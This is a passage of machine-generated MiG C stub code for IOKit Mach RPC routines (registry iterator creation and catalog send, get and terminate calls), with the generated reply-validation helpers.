	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		uint32_t options;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_create_iterator_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_create_iterator_t__defined */

	__DeclareSendRpc(2833, "io_registry_entry_create_iterator")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->planeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->options = options;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2833;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2833, "io_registry_entry_create_iterator")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2833, "io_registry_entry_create_iterator")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_create_iterator_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_create_iterator_t((__Reply__io_registry_entry_create_iterator_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_create_iterator_t__defined) */

	*iterator = Out0P->iterator.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_iterator_is_valid_t__defined)
#define __MIG_check__Reply__io_iterator_is_valid_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_iterator_is_valid_t(__Reply__io_iterator_is_valid_t *Out0P)
{

	typedef __Reply__io_iterator_is_valid_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2934) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_iterator_is_valid_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_iterator_is_valid */
mig_external kern_return_t io_iterator_is_valid
(
	mach_port_t iterator,
	boolean_t *is_valid
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t is_valid;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t is_valid;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_iterator_is_valid_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_iterator_is_valid_t__defined */

	__DeclareSendRpc(2834, "io_iterator_is_valid")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = iterator;
	InP->Head.msgh_id = 2834;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2834, "io_iterator_is_valid")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2834, "io_iterator_is_valid")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_iterator_is_valid_t__defined)
	check_result = __MIG_check__Reply__io_iterator_is_valid_t((__Reply__io_iterator_is_valid_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_iterator_is_valid_t__defined) */

	*is_valid = Out0P->is_valid;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_send_data_t__defined)
#define __MIG_check__Reply__io_catalog_send_data_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_send_data_t(__Reply__io_catalog_send_data_t *Out0P)
{

	typedef __Reply__io_catalog_send_data_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2936) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_catalog_send_data_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_send_data */
mig_external kern_return_t io_catalog_send_data
(
	mach_port_t master_port,
	uint32_t flag,
	io_buf_ptr_t inData,
	mach_msg_type_number_t inDataCnt,
	kern_return_t *result
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t inData;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t flag;
		mach_msg_type_number_t inDataCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_catalog_send_data_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_send_data_t__defined */

	__DeclareSendRpc(2836, "io_catalog_send_data")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t inDataTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_VIRTUAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->inData = inDataTemplate;
	InP->inData.address = (void *)(inData);
	InP->inData.size = inDataCnt;
#else	/* UseStaticTemplates */
	InP->inData.address = (void *)(inData);
	InP->inData.size = inDataCnt;
	InP->inData.deallocate =  FALSE;
	InP->inData.copy = MACH_MSG_VIRTUAL_COPY;
	InP->inData.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->flag = flag;

	InP->inDataCnt = inDataCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2836;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2836, "io_catalog_send_data")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2836, "io_catalog_send_data")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_send_data_t__defined)
	check_result = __MIG_check__Reply__io_catalog_send_data_t((__Reply__io_catalog_send_data_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_send_data_t__defined) */

	*result = Out0P->result;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_terminate_t__defined)
#define __MIG_check__Reply__io_catalog_terminate_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_terminate_t(__Reply__io_catalog_terminate_t *Out0P)
{

	typedef __Reply__io_catalog_terminate_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2937) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_catalog_terminate_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_terminate */
mig_external kern_return_t io_catalog_terminate
(
	mach_port_t master_port,
	uint32_t flag,
	io_name_t name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_catalog_terminate_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_terminate_t__defined */

	__DeclareSendRpc(2837, "io_catalog_terminate")

	InP->NDR = NDR_record;

	InP->flag = flag;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->name, name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->name, name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2837;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2837, "io_catalog_terminate")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2837, "io_catalog_terminate")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_terminate_t__defined)
	check_result = __MIG_check__Reply__io_catalog_terminate_t((__Reply__io_catalog_terminate_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_terminate_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_get_data_t__defined)
#define __MIG_check__Reply__io_catalog_get_data_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_get_data_t(__Reply__io_catalog_get_data_t *Out0P)
{

	typedef __Reply__io_catalog_get_data_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2938) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->outData.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->outData.size != Out0P->outDataCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_catalog_get_data_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_get_data */
mig_external kern_return_t io_catalog_get_data
(
	mach_port_t master_port,
	uint32_t flag,
	io_buf_ptr_t *outData,
	mach_msg_type_number_t *outDataCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t outData;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t outDataCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t outData;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t outDataCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_catalog_get_data_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_get_data_t__defined */

	__DeclareSendRpc(2838, "io_catalog_get_data")

	InP->NDR = NDR_record;

	InP->flag = flag;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2838;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2838, "io_catalog_get_data")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2838, "io_catalog_get_data")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_get_data_t__defined)
	check_result = __MIG_check__Reply__io_catalog_get_data_t((__Reply__io_catalog_get_data_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_get_data_t__defined) */

	*outData = (io_buf_ptr_t)(Out0P->outData.address);
	*outDataCnt = Out0P->outDataCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_get_gen_count_t__defined)
#define __MIG_check__Reply__io_catalog_get_gen_count_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_get_gen_count_t(__Reply__io_catalog_get_gen_count_t *Out0P)
{

	typedef __Reply__io_catalog_get_gen_count_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2939) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_catalog_get_gen_count_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_get_gen_count */
mig_external kern_return_t io_catalog_get_gen_count
(
	mach_port_t master_port,
	uint32_t *genCount
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t genCount;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t genCount;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_catalog_get_gen_count_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_get_gen_count_t__defined */

	__DeclareSendRpc(2839, "io_catalog_get_gen_count")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2839;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2839, "io_catalog_get_gen_count")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2839, "io_catalog_get_gen_count")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_get_gen_count_t__defined)
	check_result = __MIG_check__Reply__io_catalog_get_gen_count_t((__Reply__io_catalog_get_gen_count_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_get_gen_count_t__defined) */

	*genCount = Out0P->genCount;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_module_loaded_t__defined)
#define __MIG_check__Reply__io_catalog_module_loaded_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_module_loaded_t(__Reply__io_catalog_module_loaded_t *Out0P)
{

	typedef __Reply__io_catalog_module_loaded_t __Reply __attribute__((unused));
